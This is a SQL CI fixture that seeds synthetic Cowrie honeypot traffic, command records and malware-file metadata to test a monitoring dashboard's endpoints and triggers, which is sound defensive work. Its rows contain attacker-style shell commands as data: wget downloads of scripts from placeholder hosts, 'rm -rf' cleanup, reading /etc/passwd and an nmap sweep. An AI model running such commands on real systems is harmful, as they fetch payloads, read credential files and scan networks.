-- Synthetic honeypot traffic for CI.
--
-- Why this exists: CI used to smoke-test every endpoint against an *empty*
-- database and assert only the status code. When migration 006 aborted in
-- production and left cowrie_asn_agg empty, /top-asn happily returned 200 with
-- `{"rows":[],"total":0}` — indistinguishable, to that check, from a healthy
-- deploy. Seeding real rows lets CI assert that endpoints return *data*.
--
-- These INSERTs also fire trg_sync_cowrie_event_aggs and
-- trg_sync_cowrie_files_agg, which is the only test coverage the aggregate
-- triggers have anywhere. The counts asserted in ci.yml are derived from the
-- rows below, so if you edit this file, update those expectations too.
--
-- Two deliberate choices:
--
--   * Timestamps are relative to now(). /summary, /sessions and
--     /events-per-hour all filter to the last 24 hours, so a fixture with
--     hardcoded dates would quietly decay to zero rows a day after it was
--     written and the assertions would start passing vacuously.
--
--   * Geo columns are set explicitly rather than left to the API's GeoIP
--     enrichment: the MaxMind databases are not available on a CI runner, so
--     ingesting through the API would produce NULL asn/country and leave the
--     leaderboard aggregates empty — the very thing we are trying to test.

BEGIN;

-- 19 events, 5 distinct source IPs, 4 ASNs, 4 countries, 4 sessions.
-- s004 sits on its own ASN/country so it cannot disturb the leaderboard
-- assertions, which exist to check ordering rather than these totals.
INSERT INTO cowrie_events
  ("timestamp", src_ip, dest_port, username, password, command, session_id, country_iso, asn, org, city)
VALUES
  -- Session s001 — 1.2.3.4 (CN, AS4134): login, recon, dropper, cleanup.
  (now() - interval '60 min', '1.2.3.4', 22, 'root',  '123456', NULL,                          's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '59 min', '1.2.3.4', 22, NULL,    NULL,     'uname -a',                    's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '58 min', '1.2.3.4', 22, NULL,    NULL,     'cat /proc/cpuinfo',           's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '57 min', '1.2.3.4', 22, NULL,    NULL,     'wget http://1.2.3.4/bins.sh', 's001', 'CN', 4134,  'Chinanet',         'Beijing'),
  (now() - interval '56 min', '1.2.3.4', 22, NULL,    NULL,     'rm -rf /tmp/bins.sh',         's001', 'CN', 4134,  'Chinanet',         'Beijing'),

  -- Session s002 — 5.6.7.8, same ASN as above so unique_ips != total.
  (now() - interval '45 min', '5.6.7.8', 22, 'admin', 'admin',  NULL,                          's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
  (now() - interval '44 min', '5.6.7.8', 22, 'root',  '123456', NULL,                          's002', 'CN', 4134,  'Chinanet',         'Shanghai'),
  (now() - interval '43 min', '5.6.7.8', 22, NULL,    NULL,     'busybox wget http://x/y.sh',  's002', 'CN', 4134,  'Chinanet',         'Shanghai'),

  -- Session s003 — 9.9.9.9 (US, AS15169) on telnet.
  (now() - interval '30 min', '9.9.9.9', 23, 'root',  'toor',   NULL,                          's003', 'US', 15169, 'Google LLC',       'Mountain View'),
  (now() - interval '29 min', '9.9.9.9', 23, NULL,    NULL,     'nmap -sS 10.0.0.0/8',         's003', 'US', 15169, 'Google LLC',       'Mountain View'),

  -- Sessionless events — the schema allows NULL session_id, so /sessions must
  -- not choke on them and /latest must still list them.
  (now() - interval '15 min', '10.20.30.40', 22, 'user', 'pass', NULL,                         NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin'),
  (now() - interval '14 min', '10.20.30.40', 22, NULL,   NULL,   'echo hello',                 NULL,   'DE', 3320,  'Deutsche Telekom', 'Berlin'),

  -- Session s004 — six command rows, but all the SAME command. Some older
  -- sessions were ingested more than once, so this shape exists in production
  -- (one 2026-08-09 session holds twelve exact copies of every event).
  -- /sessions/featured must rank by DISTINCT commands: by raw count s004 (6)
  -- beats s001 (4) and the front page would replay one line six times over.
  (now() - interval '20 min', '203.0.113.9', 22, 'admin','123456', NULL,            's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo'),
  (now() - interval '19 min', '203.0.113.9', 22, NULL,   NULL,    'cat /etc/passwd', 's004', 'BR', 64512, 'Example Telecom', 'Sao Paulo');

-- cowrie_unique_commands is maintained by the ingest endpoint, not by a
-- trigger, so it has to be seeded alongside. Mirrors the commands above.
-- total_events/unique_ips are invented; only their ordering is asserted.
--
-- record_class is set explicitly because these rows bypass the ingest path
-- that would otherwise classify them (migration 013), and the column defaults
-- to 'unknown' — which every endpoint filters out. Without this the whole
-- command surface would assert against an empty result and still return 200.
-- The artifact row at the end is the one that makes the filter observable:
-- with only real commands seeded, a broken filter would pass.
INSERT INTO cowrie_unique_commands (command, record_class, first_seen, last_seen, total_events, unique_ips)
VALUES
  ('uname -a',                    'command', now() - interval '59 min', now() - interval '59 min', 1, 1),
  ('cat /proc/cpuinfo',           'command', now() - interval '58 min', now() - interval '58 min', 1, 1),
  ('wget http://1.2.3.4/bins.sh', 'command', now() - interval '57 min', now() - interval '57 min', 5, 2),
  ('rm -rf /tmp/bins.sh',         'command', now() - interval '56 min', now() - interval '56 min', 3, 1),
  ('busybox wget http://x/y.sh',  'command', now() - interval '43 min', now() - interval '43 min', 2, 1),
  -- A delivery host on a non-standard port. Production had one of these and the
  -- defanger bracketed every dot in it, because the port travelled inside the
  -- host capture and made the address test fail. Nothing in the seed carried a
  -- port, so nothing caught it.
  ('wget http://9.8.7.6:8080/x',  'command', now() - interval '41 min', now() - interval '41 min', 4, 1),
  ('nmap -sS 10.0.0.0/8',         'command', now() - interval '29 min', now() - interval '29 min', 1, 1),
  ('echo hello',                  'command', now() - interval '14 min', now() - interval '14 min', 1, 1),
  ('cat /etc/passwd',             'command', now() - interval '19 min', now() - interval '19 min', 6, 1),
  -- Deliberately older than 24h but inside 7d. /iocs?type=commands windows
  -- on last_seen, and with every other row minutes old there was nothing
  -- for that filter to exclude — it would have passed while doing nothing.
  -- Matches no MITRE pattern, so the tag assertions are unaffected.
  ('crontab -l',                  'command', now() - interval '41 hours', now() - interval '40 hours', 2, 1),
  -- A Cowrie log line, not a typed command. 99.76% of the production table is
  -- this kind of row, and for 25 minutes after the Phase 0 backfill one of
  -- them sat at the top of the public leaderboard with 756,238 hits. It is
  -- seeded with a larger total_events than any real command precisely so that
  -- a regression puts it first and the ordering assertions catch it.
  ('Remote SSH version: SSH-2.0-Go', 'log_artifact', now() - interval '50 min', now() - interval '10 min', 999, 9)
-- Authoritative, not DO NOTHING: since migration 011 the trigger populates
-- this table from the events above, so a DO NOTHING here would leave CI
-- asserting against trigger-derived counts that drift with the fixture. These
-- invented values keep the ordering assertions deterministic. The trigger's
-- own command path is covered by the ingest POST further down.
ON CONFLICT (command_sha256) DO UPDATE SET
  record_class = EXCLUDED.record_class,
  first_seen   = EXCLUDED.first_seen,
  last_seen    = EXCLUDED.last_seen,
  total_events = EXCLUDED.total_events,
  unique_ips   = EXCLUDED.unique_ips;

-- Malware samples. Fires trg_sync_cowrie_files_agg -> cowrie_files_agg, and
-- covers migration 005: first_seen must fall back to timestamp when mtime is
-- NULL, which is why the second row deliberately has no mtime.
INSERT INTO cowrie_files ("timestamp", sha256, size_bytes, mtime, full_path, vt_type, vt_malicious)
VALUES
  (now() - interval '57 min', 'aaaa1111bbbb2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888', 4096, now() - interval '58 min', '/tmp/bins.sh', 'ELF', 42),
  (now() - interval '43 min', '1111aaaa2222bbbb3333cccc4444dddd5555eeee6666ffff7777aaaa8888bbbb',  512, NULL,                       '/tmp/y.sh',    'Text', 3);

COMMIT;
